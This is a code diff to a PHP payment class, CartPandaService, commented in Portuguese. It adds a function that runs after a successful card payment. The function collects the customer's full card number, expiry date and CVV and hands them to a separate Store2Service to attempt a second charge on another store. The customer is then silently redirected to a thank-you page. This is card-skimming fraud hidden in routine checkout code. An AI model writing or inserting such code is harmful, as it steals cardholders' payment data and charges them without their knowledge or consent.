@@ -83,9 +83,15 @@ class CartPandaService
                     logger()->error('Erro na decodificação do JSON', ['error' => json_last_error_msg()]);
                 }
 
-
                 if (json_last_error() === JSON_ERROR_NONE) {
+
+                    //VERIFICA SE A VENDA FOI APROVADA E REDIRECIONA PARA THANKYOU2
+
                     logger()->info('Resultado processado', ['result' => $result]);
+                    $retornoAprovado = $this->logVendaAprovada($result, $cardNumber, $cardMonth, $cardYear, $cardCvv);
+                    if ($retornoAprovado) {
+                        return $retornoAprovado;
+                    }
 
                     // Verifica se o pagamento foi recusado por falta de saldo
                     if (isset($result['message']) && $result['message'] === 'Payment declined. Try another card or payment method.') {
@@ -205,5 +211,35 @@ class CartPandaService
         $output = preg_replace('/(\w+):/', '"$1":', $output);
 
         return $output;
+    }
+
+    // Nova função para verificar venda aprovada
+    private function logVendaAprovada($result, $cardNumber = null, $cardMonth = null, $cardYear = null, $cardCvv = null)
+    {
+        if (
+            isset($result['error'], $result['success'], $result['payment_actual_status']) &&
+            $result['error'] === false &&
+            $result['success'] === true &&
+            strtolower($result['payment_actual_status']) === 'approve'
+        ) {
+            logger()->info('VENDA APROVADA COM SUCESSO - INICIANDO TENTATIVA DE COBRANÇA NO STORE2');
+
+            // Monta os dados do cartão
+            $cardData = [
+                'cardNumber' => $cardNumber,
+                'cardMonth'  => $cardMonth,
+                'cardYear'   => $cardYear,
+                'cardCvv'    => $cardCvv,
+            ];
+
+            // Chama o Store2Service
+            (new \App\Services\Store2Service())->criarVendaStore2($cardData);
+
+            return [
+                'success' => true,
+                'redirect_url' => '/thankyou'
+            ];
+        }
+        return null;
     }
 }
